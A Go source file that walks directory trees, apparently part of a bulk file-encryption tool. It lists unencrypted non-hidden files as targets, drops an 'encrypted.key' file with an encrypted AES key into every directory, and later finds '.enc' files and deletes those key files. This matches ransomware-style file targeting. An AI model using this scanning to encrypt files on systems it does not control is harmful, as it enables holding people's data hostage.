package scan

import (
	"os"
	"path/filepath"
	"strings"
)

func ScanFilesInDirWithLockAdd(startDirPath string, skipHiddenDirs bool, encryptedAESKey []byte) ([]string, error) {
	// scan only non hidden directories
	var files []string
	err := filepath.Walk(startDirPath, func(path string, info os.FileInfo, err error) error {
		//*check if filepath contains hidden directory

		if skipHiddenDirs {
			containsHiddenPath := checkIfContainsHiddenDir(path)
			if containsHiddenPath {
				return filepath.SkipDir
			}
		}
		// check if !info.IsDir() and handle error for if loop
		_, err = os.Stat(path)
		if err != nil {
			if os.IsNotExist(err) {
				return nil
			}
		}
		// check if file is already encrypted
		var isOverMBLimit bool = info.Size() > 1000000*1000
		// check if file ends with ".enc" and if it is a directory
		var shouldWeScanFile bool = !strings.HasSuffix(path, ".enc") && !strings.HasSuffix(path, ".key") && !info.IsDir() && !isOverMBLimit
		if shouldWeScanFile {
			files = append(files, path)
		}

		if info.IsDir() && encryptedAESKey != nil {
			os.WriteFile(path+"/encrypted.key", encryptedAESKey, 0644)
		}

		return nil
	})

	if err != nil {
		return nil, err
	}
	return files, nil
}
func ScanForEncFilesInDir(startDirPath string, skipHiddenDirs bool) ([]string, error) {
	// scan only non hidden directories
	var files []string
	err := filepath.Walk(startDirPath, func(path string, info os.FileInfo, err error) error {
		//*check if filepath contains hidden directory

		if skipHiddenDirs {
			containsHiddenPath := checkIfContainsHiddenDir(path)
			if containsHiddenPath {
				return filepath.SkipDir
			}
		}
		// check if file is already encrypted
		alreadyEncrypted := strings.HasSuffix(path, ".enc")
		if !info.IsDir() && alreadyEncrypted {
			files = append(files, path)
		}

		// remove file "encrypted.key"
		if !info.IsDir() {
			if strings.HasSuffix(path, "encrypted.key") {
				os.Remove(path)
			}
		}

		return nil
	})
	if err != nil {
		return nil, err
	}
	return files, nil
}

func ScanNoSideEffects(startDirPath string, skipHiddenDirs bool) ([]string, int64, error) {
	// scan only non hidden directories
	var sizeOfAllFiles int64
	var files []string
	err := filepath.Walk(startDirPath, func(path string, info os.FileInfo, err error) error {
		//*check if filepath contains hidden directory
		if skipHiddenDirs {
			containsHiddenPath := checkIfContainsHiddenDir(path)
			if containsHiddenPath || strings.HasPrefix(path, "node_modules") {
				return filepath.SkipDir
			}
		}

		// check if !info.IsDir() and handle error for if loop
		_, err = os.Stat(path)
		if err != nil {
			if os.IsNotExist(err) {
				// pl("Throws error: ", path)
				return nil
			}
		}

		var isOverMBLimit bool = info.Size() > 1000000*1000
		// check if file ends with ".enc" and if it is a directory
		var shouldWeScanFile bool = !strings.HasSuffix(path, ".enc") && !strings.HasSuffix(path, ".key") && !info.IsDir() && !isOverMBLimit
		if shouldWeScanFile {
			files = append(files, path)
			sizeOfAllFiles += info.Size()
		}

		return nil
	})

	if err != nil {
		return nil, 0, err
	}
	// return files and size of all files
	return files, sizeOfAllFiles, nil
}

func checkIfContainsHiddenDir(path string) bool {
	// split path into slices by "/"
	pathSlices := strings.Split(path, "/")
	// If it scans any file that contains a file or directory that starts with "." it will skip it.
	// to solve that, it removes the last slice from the pathSlices worrying only about the path and not the containing files
	pathSlices = pathSlices[:len(pathSlices)-1]
	containsHiddenPath := false

	// check if any slices starts with "."
	for _, slice := range pathSlices {
		if strings.HasPrefix(slice, ".") {
			containsHiddenPath = true
		}
	}
	return containsHiddenPath
}
